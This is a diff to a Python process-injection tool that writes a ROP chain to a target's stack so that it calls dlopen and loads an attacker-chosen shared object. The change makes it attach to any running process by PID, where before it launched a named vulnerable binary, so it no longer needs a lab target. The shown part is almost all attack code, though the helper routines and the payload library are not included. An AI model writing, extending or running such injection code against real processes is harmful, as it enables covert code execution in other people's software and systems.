@@ -11,8 +11,8 @@ class ProcessInjector:
     constructing and writing the ROP chain, and interacting with the process.
     """
 
-    def __init__(self, binary_path, so_path):
-        self.binary_path = binary_path
+    def __init__(self, target_pid, so_path):
+        self.target_pid = target_pid
         self.so_path = so_path
         self.target_process = None
         self.exploit_utils = None
@@ -21,8 +21,7 @@ class ProcessInjector:
         """
         Start the target process and attach GDB for debugging.
         """
-        self.target_process = process([self.binary_path])
-        self.exploit_utils = ExploitUtils(self.target_process.pid)
+        self.exploit_utils = ExploitUtils(self.target_pid)
 
     def inject_so(self):
         """
@@ -44,16 +43,13 @@ class ProcessInjector:
         # Write the ROP chain to the stack at the current RSP
         self.exploit_utils.write_memory(address=syscall_info.rsp, content=dlopen_rop_chain)
 
-        self.target_process.sendline()
-        self.target_process.interactive()
-
 
 def parse_args():
     """
     Parse command-line arguments.
     """
     parser = argparse.ArgumentParser(description="[*] Process injection on a vulnerable binary.")
-    parser.add_argument("binary", help="[*] Path to the vulnerable binary.")
+    parser.add_argument("target_pid", help="[*] PID of the target process.")
     parser.add_argument("so", help="[*] Path to the shared object (.so) file.")
     return parser.parse_args()
 
@@ -66,7 +62,7 @@ def main():
     user_args = parse_args()
 
     # Initialize and start the injection process
-    injector = ProcessInjector(user_args.binary, user_args.so)
+    injector = ProcessInjector(user_args.target_pid, user_args.so)
     injector.start_target_process()
     injector.inject_so()
 
